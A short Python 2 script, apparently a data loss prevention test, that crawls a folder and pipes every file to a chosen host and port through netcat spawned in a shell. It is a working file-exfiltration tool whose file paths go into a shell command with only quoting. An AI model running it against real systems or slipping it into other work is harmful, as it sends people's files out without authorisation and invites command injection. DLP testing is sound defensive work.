#!/usr/bin/python

import os, getopt, sys, subprocess, time

def netCatTest(path, destination, port):
	print "nc " + destination + " " + str(port) + " < " +  "\"" + path + "\""
	#spawn off our netcat subprocess
	subprocess.Popen("nc " + destination + " " + str(port) + " < " +  "\"" + path + "\"", shell=True)
	time.sleep(.1) #pause a bit to keep from overloading

def crawlDirectory(path, destination, port):
	
	#walk our directory structure
	for root, dirs, files in os.walk(path):
		for file in files:
			netCatTest(root + "/" + file, destination, port)

def usage():
	print "\nUsage: ./dlpTest.py [-h] [-d] [-p] [-f]"
	print "\th: help\n\td: destination to exfiltrate files to\n\tp: port for exfiltration\n\tf: folder to crawl\n"

def main():
	try:
		opts, args = getopt.getopt(sys.argv[1:], "d:p:f:h")
	except getopt.GetoptError, err:
		print str(err) # will print something like "option -a not recognized"
		usage()
		sys.exit(2)
	destination = ""
	path = ""
	port = 80
	
	#grab all of our arguments
	for o, a in opts:
		if o in ("-d", "--destination"):
			destination = a
		elif o in ("-p", "--port"):
			port = int(a)
		elif o in ("-f", "--folder"):
			path = a
		elif o in ("-h", "--help"):
			usage()
			sys.exit()
		else:
			assert False, "unhandled option"

	if (destination == "" or path == ""):
		#require these specific arguments
		usage()
		sys.exit()
	
	crawlDirectory(path, destination, port)
	print "\nFinished"

if __name__ == "__main__":
    main()